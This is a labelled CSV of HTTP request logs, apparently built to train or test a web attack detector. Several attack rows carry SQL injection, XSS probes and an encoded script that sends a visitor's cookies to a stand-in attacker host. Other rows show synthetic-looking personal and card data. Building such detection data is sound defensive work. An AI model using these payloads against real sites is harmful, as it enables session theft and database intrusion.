@timestamp,auth_token_hash,method,path,path_normalized,remote_ip,request_id,response_size,response_time_ms,sampling_flag,status,upstream,user_agent,user_id_hash,user_role,waf_action,waf_rule_id,label
2026-01-01 07:29:22+00:00,80e310498aa1441e1361d2cb6694198def94175bd9b0b28788c4a129dbdb2d50,GET,/tienda1/imagenes/logo.gif HTTP/1.1,/tienda1/imagenes/logo.gif HTTP/1.1,192.168.0.153,965df5d9c2ce4595b00863c10a83f66d,100.0,100.0,0,200,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8du93,USER,0,0,0
2026-03-09 11:07:56+00:00,(empty),POST,/api/auth/login,/api/auth/login,172.20.0.10,9bc6396e8bae265cbf8044de562fd359,372.0,252.0,0,200,172.20.0.15:8001,python-requests/2.32.5,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,0
2026-01-01 16:27:26+00:00,a78681f110f7b81b4056bae5f56f6a694869b6362bba1abcaebc59c169cfa3b2,GET,/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=100&cantidad=36&B1=A%F1adir+al+carrito HTTP/1.1,/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=100&cantidad=36&B1=A%F1adir+al+carrito HTTP/1.1,192.168.0.153,1044ef590a4042d2aee79ebd2c42a778,100.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8o3in,USER,0,0,1
2026-01-01 06:35:10+00:00,2f86953edb5bacf4899ae0df5a0d2860556bbe172ff55208c15c37c41e7b7922,GET,/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,192.168.0.153,1e150996d7514ffaa21123477a05cdae,100.0,100.0,0,200,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8oycl,USER,0,0,0
2026-01-01 09:58:40+00:00,d2a5ff54883306f5edb95441dec0fa156e744eeb0867fb80b79b624d14570d0e,GET,/tienda1/miembros/fotos.jsp HTTP/1.1,/tienda1/miembros/fotos.jsp HTTP/1.1,192.168.0.153,51e450912ae24d429bbad8eaf2e911f1,100.0,100.0,0,200,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf85mw6,USER,0,0,0
2026-01-01 12:56:31+00:00,a682f51580722d1ba5725cef3a53a84614d95b2b33c7a3b90ba4c0e1a05abd51,GET,/tienda1/6909030637832563290.jsp HTTP/1.1,/tienda1/6909030637832563290.jsp HTTP/1.1,192.168.0.153,bc136802e9f04487afc05c9865739ed9,100.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8uvsu,USER,0,0,1
2026-03-09 08:24:31+00:00,(empty),POST,/api/auth/login,/api/auth/login,172.20.0.10,473e8259be3f5f488e7beb0708703dd8,169.0,0.0,0,429,(empty),python-requests/2.32.5,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,1
2026-01-01 02:41:32+00:00,840d2b1c24d1b3c351d758120c364a206f607cafc1c6a7320078e9dd5aec66c2,GET,/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,192.168.0.153,9db23c5672794958a1aab05cd78cec36,100.0,100.0,0,200,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8sx4m,USER,0,0,0
2026-03-09 23:08:00+00:00,5cf796f6e3ff64d232158932e8bdedaaedb498b211548fdc63db046a41ba25e4,GET,/api/products/1,/api/products/{id},172.20.0.10,45dbf6f921e8ee039a6521e7e50f2f10,109.0,6.0,0,200,172.20.0.11:8002,python-requests/2.32.5,13272ebc99822fe837bbaf0d5a0be884de418312d2c250470c247b60eb3a88f5,USER,0,0,0
2026-03-09 21:37:00+00:00,6e7c228074eab602c7a453cc3d69dd148e298a0a9a52b46afa115039aefef8ac,GET,/api/products/,/api/products,172.20.0.10,e32f1e6fc8175036d985b60b22337035,2650.0,7.0,0,200,172.20.0.11:8002,python-requests/2.32.5,13272ebc99822fe837bbaf0d5a0be884de418312d2c250470c247b60eb3a88f5,USER,0,0,0
2026-03-09 22:27:00+00:00,8b9e7aecdebf7b6fdc7f5924da4cf8be5c96aadea76d4f852a34c9b95298b3b8,GET,/api/products/6,/api/products/{id},172.20.0.10,4d058a2135b9e7680b257765e8a766f2,109.0,5.0,0,200,172.20.0.11:8002,python-requests/2.32.5,3280aa0fc5842471d1072ee83a22331e704560ced3ba5c63979a3abf9312f453,USER,0,0,0
2026-01-01 12:46:02+00:00,f0e496f026d7c15db119f75c242eabcac1d3c31744a9b7fe5187407ccb8234d5,GET,/tienda1/publico.INC HTTP/1.1,/tienda1/publico.INC HTTP/1.1,192.168.0.153,3cd19863df4b4302add1c58e4b21c1e7,100.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8jlgh,USER,0,0,1
2026-01-01 16:22:51+00:00,31255e4620af09fbe8cf8a28c2f1ef1710b1ac1f3c65c486096d94a3c4214cc2,POST,/tienda1/publico/autenticar.jsp HTTP/1.1,/tienda1/publico/autenticar.jsp HTTP/1.1,192.168.0.153,188f8d7c957841dbb39e0f0ea68ed04c,0.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8c5bl,USER,0,0,1
2026-03-09 20:43:00+00:00,(empty),GET,/api/cart/,/api/cart,172.20.0.10,5e6481c738840f2ee7d269ccaef5f4e5,43.0,7.0,0,401,172.20.0.9:8004,python-requests/2.32.5,(empty),GUEST,0,0,0
2026-03-09 10:37:54+00:00,(empty),GET,/api/users/by-email/admin@gmail.com,/api/users/by-email/{email},172.20.0.10,2df470cd317e07e889ef7cf15513ce21,27.0,8.0,0,404,172.20.0.12:8000,python-httpx/0.28.1,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,1
2026-01-01 05:35:50+00:00,e17a3e58804be93101421da050fa9042e5a75f34ecd28d9616083de4431ac034,GET,/tienda1/miembros/editar.jsp?modo=registro&login=hadrian&password=celula1io&nombre=Jaqueline&apellidos=Godoy+Fradera&email=shih_brusse%40professionalhost.jp&dni=53933880F&direccion=Plza.+De+Los+Conquistadores+182+&ciudad=Morales+del+Vino&cp=40171&provincia=Valencia&ntc=1541444021319279&B1=Registrar HTTP/1.1,/tienda1/miembros/editar.jsp?modo=registro&login=hadrian&password=celula1io&nombre=Jaqueline&apellidos=Godoy+Fradera&email=shih_brusse%40professionalhost.jp&dni=53933880F&direccion=Plza.+De+Los+Conquistadores+182+&ciudad=Morales+del+Vino&cp=40171&provincia=Valencia&ntc=1541444021319279&B1=Registrar HTTP/1.1,192.168.0.153,69ec897d96644a8f978cc2148a22edce,100.0,100.0,0,200,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8ns6b,USER,0,0,0
2026-03-09 10:44:41+00:00,9bdf7b3448bda8385e921122907a277c224f217d2da2a375e60736d5455f263e,GET,/api/users/by-email/user6@gmail.com,/api/users/by-email/{email},172.20.0.10,49aa109746d8e05effb218283088de03,146.0,7.0,0,200,172.20.0.12:8000,python-httpx/0.28.1,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,0
2026-03-10 00:29:00+00:00,978854dc4b7811cc892df48abafb6428d8b0ffa2048af7e0a447401be5714a41,GET,/api/inventory/7,/api/inventory/{id},172.20.0.10,fd2169491bde8adca8962a9ab5e479df,30.0,7.0,0,200,172.20.0.12:8003,python-requests/2.32.5,2a12a5923de4cf6666f1e89ca01b065eec143477a6efa563b072311ca3c58cf3,USER,0,0,0
2026-01-01 16:37:39+00:00,2df09b649ba7c0fd45def85d04949ef41cc785e34834a66b12526e09e645748a,POST,/tienda1/miembros/editar.jsp HTTP/1.1,/tienda1/miembros/editar.jsp HTTP/1.1,192.168.0.153,b0275fbce6064c7fbb7c9b4962bf5aac,0.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf85clq,USER,0,0,1
2026-03-09 11:17:35+00:00,(empty),POST,/api/inventory/update,/api/inventory/update,10.0.0.131,519e7429f34259765ad58ed996d6e8da,113.0,4.0,0,422,172.20.0.14:8003,curl/7.68,d41d8cd98f00b204e9800998ecf8427e,USER,0,0,1
2026-03-09 06:55:36+00:00,57e8f5ce4018456d1b65d857b49ed4a0af650603ec85acb19af649ba6a8e2269,GET,/api/products/,/api/products,227.214.25.131,96f61a5620b158e276e2b817e5e3a734,3328.0,9.0,0,200,172.20.0.12:8002,Python/3.14 aiohttp/3.13.2,13272ebc99822fe837bbaf0d5a0be884de418312d2c250470c247b60eb3a88f5,USER,0,0,0
2026-01-01 10:56:24+00:00,10316772993d78902f27624718b829c7f481244c9949a9ec6c6d29d20519888a,GET,/tienda1/publico/anadir.jsp?id=1&nombreA=Vino+Rioja&precio=85&cantidad=98&B1=A%F1adir+al+carrito HTTP/1.1,/tienda1/publico/anadir.jsp?id=1&nombreA=Vino+Rioja&precio=85&cantidad=98&B1=A%F1adir+al+carrito HTTP/1.1,192.168.0.153,bbf48800349743a5ad8c87c70cbbe263,100.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8qkt2,USER,0,0,1
2026-01-01 14:18:55+00:00,685b601a7e836c00d9934174393d8ae0a3c40df9ccd3b6260c14a8806f3b136c,GET,/tienda1/miembros/editar.jsp?modo=registro&login=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&password=e%21sca3zo&nombre=Aixa&apellidos=Lagares+Planelles&email=sclommari%40ceramicasmi%F1o.gm&dni=70803791Q&direccion=Plaza+Santa+Maria+La+Rica%2C+77%2C+4D&ciudad=Chalamera&cp=33777&provincia=Santa+Cruz+de+Tenerife&ntc=1250583387066531&B1=Registrar HTTP/1.1,/tienda1/miembros/editar.jsp?modo=registro&login=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&password=e%21sca3zo&nombre=Aixa&apellidos=Lagares+Planelles&email=sclommari%40ceramicasmi%F1o.gm&dni=70803791Q&direccion=Plaza+Santa+Maria+La+Rica%2C+77%2C+4D&ciudad=Chalamera&cp=33777&provincia=Santa+Cruz+de+Tenerife&ntc=1250583387066531&B1=Registrar HTTP/1.1,192.168.0.153,fa396b1f33954cad888373d11dfefe79,100.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf87fds,USER,0,0,1
2026-03-09 06:49:49+00:00,f3684b601985460e4aabbbf8317ca5fe73444cbe2603b32adfc4c091f8a7de6e,POST,/api/cart/,/api/cart,13.197.245.72,a0fe25028d2e2c7915d084c9925b3897,434.0,9.0,0,200,172.20.0.9:8004,Python/3.14 aiohttp/3.13.2,3280aa0fc5842471d1072ee83a22331e704560ced3ba5c63979a3abf9312f453,USER,0,0,0
2026-01-01 15:58:59+00:00,743b9870799db6037b3e4a832ec92e77ef20a7ba55ce8eadf8ce2c2b6578e216,GET,/tienda1/publico/autenticar.jsp?modo=entrar&login=starkes&pwd=ab393n5tebob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&remember=off&B1=Entrar HTTP/1.1,/tienda1/publico/autenticar.jsp?modo=entrar&login=starkes&pwd=ab393n5tebob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&remember=off&B1=Entrar HTTP/1.1,192.168.0.153,32ab44f683164c058afbda91e07f0fd4,100.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf829a2,USER,0,0,1
2026-03-09 08:32:25+00:00,d03732e49d0ce0651fb346079ebdd82fefd82733823d5f968669c0d3bae5c544,GET,/api/products/,/api/products,41.152.213.95,7029ea0be7495c5d56936de7ea87d020,3328.0,9.0,0,200,172.20.0.12:8002,Python/3.14 aiohttp/3.13.2,b822f99a7142e909d1b0df5b7f73270e083a1900bc11003d8e4dfcf5f53f7f5e,USER,0,0,0
2026-03-09 11:01:20+00:00,(empty),GET,/api/users/by-email/user5@gmail.com,/api/users/by-email/{email},172.20.0.10,aae04a05e67c4c925cc5aee8dfcb7d34,146.0,4.0,0,200,172.20.0.12:8000,python-httpx/0.28.1,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,0
2026-01-01 16:47:47+00:00,1b988d2c13105b48ae0db265d4bd4df69eba470aa84373dc7ca927d604274dd7,POST,/tienda1/publico/anadir.jsp HTTP/1.1,/tienda1/publico/anadir.jsp HTTP/1.1,192.168.0.153,0c562d68092d434e90cad1d13ba5f10f,0.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8jkvg,USER,0,0,1
2026-03-09 21:22:00+00:00,(empty),GET,/api/products/,/api/products,172.20.0.10,6b57363318780617f88dba82bd1f4376,2650.0,5.0,0,200,172.20.0.11:8002,python-requests/2.32.5,(empty),GUEST,0,0,0
2026-01-01 13:02:56+00:00,a1f0b4e7fefcf9da737c966df1507d33316f35b6cd5efc3b411a15b661ba0108,POST,/tienda1/miembros/editar.jsp HTTP/1.1,/tienda1/miembros/editar.jsp HTTP/1.1,192.168.0.153,2eb6d330c7d34acfa5d0815f5c76a469,0.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf809vq,USER,0,0,1
2026-01-01 14:37:37+00:00,d026044c0c5f1c67884f5c9888138142f0382cf00a5213f09127dbf3bc4b5016,GET,/tienda1/publico/pagar.jsp.inc HTTP/1.1,/tienda1/publico/pagar.jsp.inc HTTP/1.1,192.168.0.153,c706080c8534482f97180c6bae589069,100.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf808yt,USER,0,0,1
2026-03-09 21:25:00+00:00,(empty),GET,/api/orders/1122,/api/orders/{id},172.20.0.10,50e00b6bdde398bb03cd3339b5235924,22.0,4.0,0,404,172.20.0.16:8005,python-requests/2.32.5,(empty),GUEST,0,0,1
2026-03-09 11:31:58+00:00,(empty),POST,/api/auth/login,/api/auth/login,172.20.0.10,54d858d02c8918e9bf86d7dcbbe0a10e,372.0,391.0,0,200,172.20.0.15:8001,python-requests/2.32.5,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,0
2026-03-09 19:32:00+00:00,549bcb84a0da6e01f056f142258eefb97923f614ceee4e19428542773326e971,GET,/api/products/,/api/products,172.20.0.10,1b17f158500afb3ef9636db489ed2612,2650.0,6.0,0,200,172.20.0.11:8002,python-requests/2.32.5,3280aa0fc5842471d1072ee83a22331e704560ced3ba5c63979a3abf9312f453,USER,0,0,0
2026-03-09 20:17:00+00:00,4be5ed497d959d3db3553a2470790b8ff060915c8fd9007ff98e4aac48a362b9,GET,/api/orders/443,/api/orders/{id},172.20.0.10,ace09fd865a02c6e5f2656a46e258177,22.0,4.0,0,404,172.20.0.16:8005,python-requests/2.32.5,d2ba184a7a7c2609831427681dca2796f19326d418e7baf952fd2e8e9002caff,USER,0,0,1
2026-03-09 11:20:24+00:00,(empty),POST,/api/inventory/update,/api/inventory/update,10.0.0.146,21c2cdae0ae91f5bfad89db0cf37655b,113.0,4.0,0,422,172.20.0.14:8003,curl/7.68,d41d8cd98f00b204e9800998ecf8427e,USER,0,0,1
2026-03-09 07:38:55+00:00,(empty),POST,/api/cart/,/api/cart,116.235.7.168,df31aeb60e9679251ae8fc77d236ee56,169.0,0.0,0,429,(empty),Python/3.14 aiohttp/3.13.2,(empty),GUEST,0,0,1
2026-03-09 23:46:00+00:00,13693c115db6681344fcda3f7efb9e1db34e34170760ccf3022072528e0f4ae5,POST,/api/cart/,/api/cart,172.20.0.10,7e62415a3fbf5d3126a72e3003bf686a,75.0,45.0,0,200,172.20.0.9:8004,python-requests/2.32.5,cc43472f547d941291d4f7e342419aa767ee9da2ded8faaba22d5c18f3aeffb5,USER,0,0,0
2026-03-09 07:16:29+00:00,(empty),POST,/api/auth/login,/api/auth/login,98.120.226.41,96b6d8f03e453889d4d29c465d5ba12b,169.0,0.0,0,429,(empty),Python/3.14 aiohttp/3.13.2,(empty),GUEST,0,0,1
2026-03-09 19:22:00+00:00,ed1a43c96749872d48e5cfb988287b243104a872073a6d9bea43b08808dc0af7,DELETE,/api/cart/,/api/cart,172.20.0.10,b41c7a7541e6ee89b2c3399d92297f68,25.0,10.0,0,200,172.20.0.9:8004,python-requests/2.32.5,b822f99a7142e909d1b0df5b7f73270e083a1900bc11003d8e4dfcf5f53f7f5e,USER,0,0,0
2026-01-01 03:23:39+00:00,e3547b2614685a2052970e220225dac3aa763ce36c164f35a4a6f48ec9a22cac,POST,/tienda1/publico/registro.jsp HTTP/1.1,/tienda1/publico/registro.jsp HTTP/1.1,192.168.0.153,5e70323f84ec49c385f69f3250aea236,0.0,100.0,0,200,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8hoeo,USER,0,0,0
2026-03-09 08:10:10+00:00,99dd3b574e8768b00baec6c067cc56c981c869e1648e2a22437a2d638791359d,POST,/api/cart/,/api/cart,61.197.11.117,60aef2c153566183754f8ce44de11ee6,510.0,8.0,0,200,172.20.0.9:8004,Python/3.14 aiohttp/3.13.2,b822f99a7142e909d1b0df5b7f73270e083a1900bc11003d8e4dfcf5f53f7f5e,USER,0,0,0
2026-03-09 10:44:13+00:00,(empty),GET,/api/products,/api/products,10.0.0.67,0357be40def648905a60bfd07f626b40,0.0,2.0,0,307,172.20.0.13:8002,curl/7.68,d41d8cd98f00b204e9800998ecf8427e,USER,0,0,1
2026-03-09 10:59:02+00:00,e00797c8e746ad55964848729c222892d073aa14dacf45993691b34956c5ca74,POST,/api/auth/login,/api/auth/login,172.20.0.10,29c95af1ad1726b5e65411d80d33eb7e,372.0,233.0,0,200,172.20.0.15:8001,python-requests/2.32.5,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,0
2026-03-09 10:39:18+00:00,(empty),GET,/api/users/by-email/user6@gmail.com,/api/users/by-email/{email},172.20.0.10,c1243ab1717e14ddc6f09815da2671b4,146.0,9.0,0,200,172.20.0.12:8000,python-httpx/0.28.1,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,0
2026-01-01 09:05:11+00:00,39487b4c77d88479cecc55ac397c3577305e8f8994c09ee995c60deaaeeed45c,GET,/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,192.168.0.153,80725ca66f104e99a4287115688dcdda,100.0,100.0,0,200,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8ru7y,USER,0,0,0
2026-01-01 14:08:21+00:00,2338f42feb4938982474e4e7020bcc542086c6cb33a091aff7f7fa883c1f1188,GET,/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E HTTP/1.1,/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E HTTP/1.1,192.168.0.153,8ade98b36a604a9d8db71bc7d7cade14,100.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8e4kx,USER,0,0,1
2026-01-01 13:39:34+00:00,4d60d2c2de8cda2e1adfe98e2c9953fe405854a72cbd155db8a1b29b1533275e,GET,/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,192.168.0.153,3d6126e718e04b7bae1b4615377a28da,100.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8ofp3,USER,0,0,1
2026-03-09 08:24:29+00:00,(empty),POST,/api/auth/login,/api/auth/login,172.20.0.10,6ad4e81e017b4263f3bba41fbd90e444,169.0,0.0,0,429,(empty),python-requests/2.32.5,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,1
2026-01-01 10:16:43+00:00,d2e531beed835ccccded09e188a0b08a6d8e30e367c2ae8d4a739ccefa8ed47b,GET,/tienda1/index.jsp.Bak HTTP/1.1,/tienda1/index.jsp.Bak HTTP/1.1,192.168.0.153,6618a3d3197e4303a94ac81a999c8ae9,100.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8nv7m,USER,0,0,1
2026-03-09 21:15:00+00:00,75e2ccecc73dd569235db348e025e0f15bb0c7c666f699ae36a6071f4d617366,DELETE,/api/cart/,/api/cart,172.20.0.10,c5ec685c230b79039f9904df1676add3,25.0,5.0,0,200,172.20.0.9:8004,python-requests/2.32.5,c3215db9fc88df0945fdbb2b5a9f29788dcabc46c75d3c894a7d1b5634aaf29c,USER,0,0,0
2026-01-01 15:29:22+00:00,61fab612fc302f8eb07f48644bce710086d510ece0cdc019bdf83425a4f6e031,PUT,/tienda1/publico/vaciar.jsp HTTP/1.1,/tienda1/publico/vaciar.jsp HTTP/1.1,192.168.0.153,a32ba5266ce440e4b5f0485aac033c19,0.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8ze6r,USER,0,0,1
2026-03-09 10:35:04+00:00,106b9b0f5948328e0e768655d7481ba9ea2cb884b5801599a140789025c80782,POST,/api/auth/login,/api/auth/login,172.20.0.10,c7d5ffbc8820985c9828c3dd2655c230,372.0,296.0,0,200,172.20.0.15:8001,python-requests/2.32.5,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,0
2026-03-09 08:31:15+00:00,(empty),POST,/api/auth/login,/api/auth/login,172.20.0.10,ee48b0f9a2a8569794bc416b8e744e03,372.0,255.0,0,200,172.20.0.15:8001,python-requests/2.32.5,d41d8cd98f00b204e9800998ecf8427e,GUEST,0,0,0
2026-03-09 11:22:53+00:00,(empty),GET,/api/search?q=phone,/api/search?q=phone,10.0.0.77,27a5da63dc2b418f2ef34740e9b51615,555.0,2.0,0,404,(empty),Chrome/120,d41d8cd98f00b204e9800998ecf8427e,USER,0,0,0
2026-01-01 03:40:34+00:00,f837ca91b628224638a89b8a79d48c80fb71d3202e3c9e43dee5c524d6e49e9d,GET,/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,192.168.0.153,4e29e2412a724aad98a99dee20e087dc,100.0,100.0,0,200,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8wdzz,USER,0,0,0
2026-01-01 09:36:00+00:00,1c9b847f24a8918d2d2516b883f84e29256885f320e43a1a233742b3228fe099,GET,/tienda1/index.jsp HTTP/1.1,/tienda1/index.jsp HTTP/1.1,192.168.0.153,d7bc99bf44f1460ea450c65b92c63737,100.0,100.0,0,200,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8syz4,USER,0,0,0
2026-03-09 10:37:59+00:00,2c0d1fe146f4051e9499b16f179919a7ace0bfeeb7019d3bd4d32657080f4ab8,GET,/api/analytics,/api/analytics,10.0.0.55,bec2626e8693516905f42d497ce441bf,153.0,2.0,0,404,(empty),Mozilla/5.0,d41d8cd98f00b204e9800998ecf8427e,USER,0,0,1
2026-01-01 16:35:04+00:00,2cac22d28fe5f2adbe603622dcfd24cc6d3fa37112c1aa2c0fa07b60a0b4cf11,POST,/tienda1/miembros/editar.jsp HTTP/1.1,/tienda1/miembros/editar.jsp HTTP/1.1,192.168.0.153,ad9c300cbd7546e3afada1c4f5c97f2f,0.0,100.0,0,500,172.20.0.11:8000,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),d41d8cd98f00b204e9800998ecf8uilw,USER,0,0,1
2026-03-09 07:47:49+00:00,(empty),POST,/api/auth/login,/api/auth/login,134.229.244.126,2952122384b7f3b7581da77127c33e07,37.0,30.0,0,401,172.20.0.15:8001,Python/3.14 aiohttp/3.13.2,(empty),GUEST,0,0,1
